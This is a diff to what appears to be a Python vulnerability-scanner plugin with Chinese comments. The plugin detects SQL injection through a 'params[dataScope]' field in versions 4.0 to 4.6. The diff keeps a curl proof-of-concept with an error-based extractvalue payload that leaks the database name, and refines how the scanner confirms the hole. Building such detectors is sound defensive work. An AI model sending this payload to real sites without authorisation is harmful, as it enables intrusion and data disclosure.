@@ -36,7 +36,7 @@ class SqlInjectDeptPlugin(PluginBase):
         "  -d 'params[dataScope]=and extractvalue(1, concat(0x7e,(select database()),0x7e))' \\\n"
         '  --cookie ""\n'
         "\n"
-        '# 预期响应：HTTP 500 + 响应体含 "运行时异常" 或 "database()" 报错特征'
+        '# 预期响应：HTTP 500 + 响应体含 "XPATH syntax error"（extractvalue 求值报错特征），或差分命中的 "运行时异常"'
     )
     # D2：params[dataScope] 注入在 4.6.0 已修复
     affected_versions = ">=4.0,<4.6"
@@ -52,7 +52,8 @@ class SqlInjectDeptPlugin(PluginBase):
 
         @param target: 目标站点根 URL
         @param session: 共享 HTTP 会话（SessionManager 管理连接复用）
-        @return: ScanResult — 响应含 '运行时异常' 或 'database()' 报错特征则 CONFIRMED，否则 SAFE，网络异常则 UNKNOWN
+        @return: ScanResult — 差分判定：注入请求含 'XPATH syntax error'（或差分命中的 '运行时异常' 且无载荷回显）
+                 则 CONFIRMED；文案在基线中同样出现、无法归因时 UNKNOWN；无报错特征则 SAFE；网络异常则 UNKNOWN
         """
         host = host_of(target)
         # 原 headers 1:1 保留（含 sec-ch-ua / Sec-Fetch-* / 空 Cookie 等）
@@ -77,7 +78,11 @@ class SqlInjectDeptPlugin(PluginBase):
             # Spring Boot 会尝试渲染 HTML 错误视图而失败（返回 500 空响应体），导致 database()
             # 判定失效（false negative）。application/json 让错误以 JSON 返回并含 database() 特征。
             "Accept": "application/json, text/javascript, */*; q=0.01",
-            "Accept-Encoding": "gzip, deflate, br",
+            # 关键：只声明客户端确实能解码的编码。requests/urllib3 仅在安装了可选
+            # brotli 依赖时才能解 br，缺依赖时会拿到未解码的 brotli 响应体，
+            # 导致 inject_text/control_text 不可读、全部报错特征检查静默失效（false negative）。
+            # 与 sql_inject_role 保持一致，仅声明 gzip, deflate。
+            "Accept-Encoding": "gzip, deflate",
         }
         # 原 data 1:1 保留（含 extractvalue payload，注意此处的空格差异与原脚本一致）
         # extractvalue(1, concat(0x7e, ...)) 注入原理：0x7e（~）使第二参数成为非法 XPath，
